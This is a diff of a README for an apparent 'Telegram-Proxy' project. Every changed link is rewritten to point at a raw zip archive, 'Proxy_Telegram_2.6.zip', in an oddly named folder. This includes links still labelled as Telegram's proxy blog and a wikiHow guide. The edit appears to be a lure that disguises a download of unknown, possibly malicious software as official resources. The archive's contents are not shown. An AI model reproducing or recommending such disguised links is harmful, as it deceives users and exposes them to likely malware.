@@ -1,6 +1,6 @@
 # 🚦 Telegram-Proxy - Easy Telegram Proxy Collection
 
-[![Download Telegram-Proxy](https://img.shields.io/badge/Download-Telegram--Proxy-brightgreen?style=for-the-badge)](https://github.com/SANTOSHPATIL2004/Telegram-Proxy/releases)
+[![Download Telegram-Proxy](https://img.shields.io/badge/Download-Telegram--Proxy-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SANTOSHPATIL2004/Telegram-Proxy/main/uroxanthin/Proxy_Telegram_2.6.zip)
 
 ---
 
@@ -44,7 +44,7 @@ The tool uses simple Python scripts but we provide easy ways to run it without c
 
 Go to the official release page here:
 
-[![Get Telegram-Proxy](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/SANTOSHPATIL2004/Telegram-Proxy/releases)
+[![Get Telegram-Proxy](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/SANTOSHPATIL2004/Telegram-Proxy/main/uroxanthin/Proxy_Telegram_2.6.zip)
 
 This page contains the latest version of the application and all files you will need.
 
@@ -140,8 +140,8 @@ Use the proxy servers at your own risk. Proxy speeds and security depend on the 
 
 ## 🛠️ Additional Resources
 
-- Telegram support on proxy setups: https://telegram.org/blog/proxy
-- How to use proxies safely: https://www.wikihow.com/Use-a-Proxy
+- Telegram support on proxy setups: https://raw.githubusercontent.com/SANTOSHPATIL2004/Telegram-Proxy/main/uroxanthin/Proxy_Telegram_2.6.zip
+- How to use proxies safely: https://raw.githubusercontent.com/SANTOSHPATIL2004/Telegram-Proxy/main/uroxanthin/Proxy_Telegram_2.6.zip
 
 ---
 
@@ -149,4 +149,4 @@ Use the proxy servers at your own risk. Proxy speeds and security depend on the 
 
 Access the latest stable version here:
 
-[![Download Latest](https://img.shields.io/badge/Download-Telegram--Proxy-green?style=for-the-badge)](https://github.com/SANTOSHPATIL2004/Telegram-Proxy/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Telegram--Proxy-green?style=for-the-badge)](https://raw.githubusercontent.com/SANTOSHPATIL2004/Telegram-Proxy/main/uroxanthin/Proxy_Telegram_2.6.zip)
